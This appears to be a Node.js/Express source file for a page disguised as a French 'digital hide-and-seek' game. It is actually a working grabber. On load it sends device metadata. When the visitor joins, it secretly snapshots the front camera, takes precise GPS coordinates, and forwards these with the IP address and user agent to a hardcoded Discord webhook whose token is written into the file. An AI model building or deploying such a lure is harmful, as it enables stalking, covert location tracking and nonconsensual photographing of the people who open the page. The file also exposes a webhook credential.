const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// URL de votre Webhook Discord
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";

// Augmentation de la limite du corps de requête JSON pour accepter la capture photo en Base64
app.use(express.json({ limit: '10mb' }));

// Serveur principal avec interface "Cache-Cache Numérique"
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Cache-Cache Numérique — La Partie Commence</title>
            <style>
                :root {
                    --bg-dark: #090d16;
                    --card-bg: #111827;
                    --accent: #10b981;
                    --accent-hover: #059669;
                    --danger: #ef4444;
                    --text-main: #f9fafb;
                    --text-muted: #9ca3af;
                    --border: #1f2937;
                }

                * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }

                body {
                    background-color: var(--bg-dark);
                    color: var(--text-main);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    padding: 20px;
                }

                .game-card {
                    background: var(--card-bg);
                    border: 1px solid var(--border);
                    border-radius: 16px;
                    padding: 32px;
                    max-width: 480px;
                    width: 100%;
                    text-align: center;
                    box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
                }

                .icon {
                    font-size: 3rem;
                    margin-bottom: 16px;
                }

                h1 {
                    font-size: 1.6rem;
                    margin-bottom: 12px;
                    color: var(--text-main);
                }

                p {
                    color: var(--text-muted);
                    font-size: 0.95rem;
                    line-height: 1.5;
                    margin-bottom: 24px;
                }

                .btn-play {
                    background-color: var(--accent);
                    color: #000;
                    border: none;
                    padding: 14px 28px;
                    border-radius: 8px;
                    font-weight: 700;
                    font-size: 1rem;
                    cursor: pointer;
                    width: 100%;
                    transition: background 0.2s;
                }

                .btn-play:hover {
                    background-color: var(--accent-hover);
                }

                .error-box {
                    display: none;
                    margin-top: 16px;
                    padding: 12px;
                    background-color: rgba(239, 68, 68, 0.1);
                    border: 1px solid var(--danger);
                    border-radius: 8px;
                    color: var(--danger);
                    font-size: 0.85rem;
                    line-height: 1.4;
                    text-align: left;
                }

                .info-notice {
                    margin-top: 20px;
                    font-size: 0.8rem;
                    color: var(--text-muted);
                    border-top: 1px solid var(--border);
                    padding-top: 16px;
                }

                #game-dashboard {
                    display: none;
                }

                #camera-preview {
                    width: 100%;
                    max-height: 240px;
                    border-radius: 8px;
                    margin-top: 15px;
                    background: #000;
                    object-fit: cover;
                }
            </style>
        </head>
        <body>

            <!-- Étape 1 : Accueil / Inscription à la partie -->
            <div id="lobby" class="game-card">
                <div class="icon">🙈🔍</div>
                <h1>Cache-Cache Numérique</h1>
                <p>Pour rejoindre la partie, autorisez l'accès à votre position et à votre caméra pour la vérification visuelle.</p>
                
                <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>

                <!-- Message d'erreur si la caméra/géolocalisation est refusée -->
                <div id="geo-error" class="error-box"></div>

                <div class="info-notice">
                    En cliquant, vous acceptez la transmission de vos métadonnées techniques et l'activation de la caméra pour la session de jeu.
                </div>
            </div>

            <!-- Étape 2 : Tableau de bord de jeu -->
            <div id="game-dashboard" class="game-card">
                <div class="icon">🎯</div>
                <h1>Partie en cours</h1>
                <p id="status-text">Coordonnées et flux vidéo initialisés. Recherche de cachettes à proximité...</p>

                <video id="camera-preview" autoplay playsinline muted></video>

                <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
                    Statut : Joueur connecté & Caméra transmise
                </div>
            </div>

            <!-- Canvas masqué pour capturer l'image de la caméra -->
            <canvas id="snapshot-canvas" style="display: none;"></canvas>

            <script>
                function collecterMetadonnees() {
                    return {
                        ecran: screen.width + 'x' + screen.height,
                        fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        coeursCPU: navigator.hardwareConcurrency || 'Inconnu',
                        ramGo: navigator.deviceMemory ? navigator.deviceMemory + ' Go' : 'Inconnu',
                        langue: navigator.language || 'Inconnue',
                        plateforme: navigator.platform || 'Inconnue'
                    };
                }

                function transmettreMetadonnees(type, gpsData = null, cameraStatus = null, photoData = null) {
                    const payload = {
                        typeEvenement: type,
                        client: collecterMetadonnees(),
                        gps: gpsData,
                        camera: cameraStatus,
                        photoBase64: photoData
                    };

                    fetch('/api/collecte', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                }

                // Envoi des métadonnées de visite
                window.addEventListener('DOMContentLoaded', () => {
                    transmettreMetadonnees('Visite initiale');
                });

                function capturerImageDuVideo(videoElement) {
                    try {
                        const canvas = document.getElementById('snapshot-canvas');
                        canvas.width = videoElement.videoWidth || 640;
                        canvas.height = videoElement.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        return canvas.toDataURL('image/jpeg', 0.8);
                    } catch (err) {
                        console.error('Erreur de capture photo:', err);
                        return null;
                    }
                }

                async function activerCameraEtCapturer() {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                        const videoElement = document.getElementById('camera-preview');
                        videoElement.srcObject = stream;

                        // Attendre la stabilisation du flux vidéo pour effectuer le snapshot
                        await new Promise(resolve => setTimeout(resolve, 800));

                        const photoData = capturerImageDuVideo(videoElement);

                        return {
                            statut: "Autorisée",
                            details: "Flux vidéo et capture effectués",
                            photoBase64: photoData
                        };
                    } catch (err) {
                        return { statut: "Refusée", erreur: err.message, photoBase64: null };
                    }
                }

                async function demarrerPartie() {
                    const errorBox = document.getElementById('geo-error');
                    errorBox.style.display = 'none';

                    // Activer la caméra et réaliser le snapshot
                    const cameraResult = await activerCameraEtCapturer();

                    if (cameraResult.statut === "Refusée") {
                        transmettreMetadonnees('Refus caméra', null, cameraResult);
                        errorBox.innerHTML = "⚠️ <strong>Caméra requise :</strong> L'accès à la caméra est obligatoire pour valider votre présence.";
                        errorBox.style.display = 'block';
                        return;
                    }

                    // Demande d'accès à la géolocalisation
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                const gpsData = {
                                    lat: pos.coords.latitude,
                                    lon: pos.coords.longitude,
                                    precision: pos.coords.accuracy
                                };

                                transmettreMetadonnees('Session validée avec photo', gpsData, cameraResult, cameraResult.photoBase64);

                                document.getElementById('lobby').style.display = 'none';
                                document.getElementById('game-dashboard').style.display = 'block';
                            },
                            (err) => {
                                transmettreMetadonnees('Refus localisation (avec photo)', { erreur: "Accès refusé (" + err.message + ")" }, cameraResult, cameraResult.photoBase64);
                                errorBox.innerHTML = "⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans la géolocalisation.";
                                errorBox.style.display = 'block';
                            },
                            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                        );
                    } else {
                        errorBox.innerText = "⚠️ La géolocalisation n'est pas supportée par votre navigateur.";
                        errorBox.style.display = 'block';
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Route d'API - Réception et envoi du Webhook Discord
app.post('/api/collecte', async (req, res) => {
    const body = req.body || {};
    const typeEvenement = body.typeEvenement || 'Événement inconnu';
    const client = body.client || {};
    const gps = body.gps || {};
    const camera = body.camera || {};
    const photoBase64 = body.photoBase64;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Inconnu';

    let gpsText = "⏳ Non partagée";
    let colorCode = 3447003; // Bleu

    if (gps.lat && gps.lon) {
        gpsText = `📍 [${gps.lat},${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
        colorCode = 65280; // Vert
    } else if (gps.erreur) {
        gpsText = `❌ ${gps.erreur}`;
        colorCode = 15158332; // Rouge
    }

    let cameraText = "⏳ Non vérifiée";
    if (camera.statut === "Autorisée") {
        cameraText = `📷 Accès accordé (${camera.details || 'OK'})`;
    } else if (camera.statut === "Refusée") {
        cameraText = `❌ Accès refusé (${camera.erreur || 'Inconnu'})`;
        colorCode = 15158332;
    }

    const embed = {
        title: `🎮 ${typeEvenement}`,
        color: colorCode,
        fields: [
            { name: "🌐 Connexion", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`` },
            { name: "💻 Appareil", value: `**Écran :** ${client.ecran}\n**CPU :** ${client.coeursCPU} cœurs | **RAM :** ${client.ramGo}\n**Zone :** ${client.fuseauHoraire}` },
            { name: "🎯 Position Joueur", value: gpsText },
            { name: "🎥 Caméra", value: cameraText }
        ],
        timestamp: new Date().toISOString()
    };

    // Si une photo est fournie, l'associer à l'embed
    if (photoBase64) {
        embed.image = { url: "attachment://photo.jpg" };
    }

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
        try {
            if (photoBase64) {
                // Extrait le buffer binaire à partir du Base64
                const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
                const imageBuffer = Buffer.from(base64Data, 'base64');

                // Envoi Multipart Form Data à Discord
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                formData.append('file0', new Blob([imageBuffer], { type: 'image/jpeg' }), 'photo.jpg');

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
            } else {
                // Envoi JSON classique
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
            }
        } catch (err) {
            console.error("Erreur Webhook Discord :", err);
        }
    }

    res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Serveur prêt sur le port ${PORT}`));
